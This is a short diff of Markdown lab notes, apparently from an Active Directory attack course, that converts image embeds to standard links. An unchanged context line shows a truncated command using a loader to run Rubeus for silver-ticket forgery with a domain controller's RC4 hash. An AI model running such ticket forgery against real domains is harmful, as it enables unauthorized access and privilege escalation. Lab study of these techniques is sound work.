@@ -1,5 +1,5 @@
 
-![[../../../attchments/Pasted image 20250619212057.png]]
+![Pasted image 20250619212057](../../../attchments/Pasted%20image%2020250619212057.png)
 
 
 ```
@@ -10,7 +10,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver/service
 the rc4 is of the domian controller
 
 
-![[../../../attchments/Pasted image 20250619212127.png]]
+![Pasted image 20250619212127](../../../attchments/Pasted%20image%2020250619212127.png)
 
-![[../../../attchments/Pasted image 20250619212624.png]]
+![Pasted image 20250619212624](../../../attchments/Pasted%20image%2020250619212624.png)
 
